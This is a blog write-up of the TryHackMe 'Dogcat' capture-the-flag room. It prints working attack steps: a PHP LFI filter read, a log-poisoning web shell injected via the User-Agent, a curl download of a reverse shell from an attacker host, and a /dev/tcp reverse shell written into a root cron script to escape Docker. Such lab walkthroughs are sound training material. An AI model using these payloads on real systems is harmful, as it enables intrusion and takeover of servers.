---
title: 'Dogcat'
description: "I made a website where you can look at pictures of dogs and/or cats! Exploit a PHP application via LFI and break out of a docker container."
date: 2024-05-04T21:18:03+02:00
tags: 
    - "tryhackme"
    - "medium"
draft: false
external_url: "https://tryhackme.com/r/room/dogcat"
---

## Questions
1. What is flag 1?
2. What is flag 2?
3. What is flag 3?
4. What is flag 4?

Simple enough...

## Reconnaissance
Looking at the request headers I can see `X-Powered-By: PHP/7.4.3` meaning that it appears to be running PHP.
When looking around on the website I see `http://trgt/?view=dog/` in the URL this means that the application is probably vulnerable to [Local File Inclusion](https://owasp.org/www-project-top-25-parameters/#top-25-local-file-inclusion-lfi-parameters).

## Exploitation

### Gettings the Source Code
We can go to `http://trgt/?view=php://filter/read=convert.base64-encode/resource=dog/../index` to get a base64 encoded version of the index.php. (the ".php" gets added by the code, as shown below)

```php
function containsStr($str, $substr) {
    return strpos($str, $substr) !== false;
}
$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
if(isset($_GET['view'])) {
    if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
        echo 'Here you go!';
        include $_GET['view'] . $ext;
    } else {
        echo 'Sorry, only dogs or cats are allowed.';
    }
}
```

It automatically appends ".php" if `&ext` is not specified. To work around this we specify it but leave it empty.

### Getting the Apache Logs

Heading towards `http://trgt/?view=./dog/../../../../var/log/apache2/access.log&ext` gives us the Apache access logs.
This can be used to execute our own commands on the server.

## Foothold
By changing our User-Agent to `<?php system($_GET['cmd']); ?>` and reloading the page we will inject that bit of PHP code in to the website. I use [User Agent Switcher and Manager](https://add0n.com/useragent-switcher.html) but there are a lot of ways to do this.

We can reset the USer-Agent back to normal after reloading the page.

If we now go to `http://trgt/?view=./dog/../../../../var/log/apache2/access.log&ext&cmd=whoami` we can see that it responded with "www-data".

### Uploading a Shell
I saved [pentestmonky](https://github.com/pentestmonkey/)'s [PHP Reverse Shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) as `shell.php` in order to download it from the target we need to start a little webserver.

```
$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Going to `http://trgt/?view=./dog/../../../../var/log/apache2/access.log&ext&cmd=curl http://<atckr>:8000/shell.php -o shell.php`
Will result in the file downloaded from the webserver we've started and saved as `shell.php` in the root of the target webserver.

We listen with `$ nc -nvlp 9001` and go to `http://trgt/shell.php`. You should see a connection come in.
```nc
$ nc -nvlp 9001
Listening on 0.0.0.0 9001
Connection received on trgt 38032
Linux e519df1bd305 4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 GNU/Linux
 19:05:55 up 28 min,  0 users,  load average: 0.00, 0.04, 0.41
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ _
```

And we're in!

## Finding the Flags
1. Running `$ pwd` we can see that we're in the `/` directory, heading towards `/var/www/html/` we find our first flag.
2. I started to travel back towards `/` and found the second flag in `/var/www/`

I couldn't directly find any other flag.

### Privilege Escalation
```sh
$ sudo -l
Matching Defaults entries for www-data on e519df1bd305:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on e519df1bd305:
    (root) NOPASSWD: /usr/bin/env
```
Looking at the hostname `e519df1bd305` I can believe that I'm in a docker container, I'll keep that in mind.
A quick visit to [GTFOBins](https://gtfobins.github.io/gtfobins/env/) and we quickly have a root shell.

3. Heading towards `/root/` we find our third flag.

The fourth flag was tricky to find. But in the `/opt/` directory there's a folder called "backups" with some scripts in it.

Placing a reverse shell in `backup.sh` gives us a shell as root on the host, escaping the container.
```sh
$ echo "#!/bin/bash" > /opt/backups/backup.sh
$ echo "/bin/bash -c 'bash -i >& /dev/tcp/<atckr>/9002 0>&1'" >> /opt/backups/backup.sh
```

4. A simple `ls` reveals the fourth and final flag.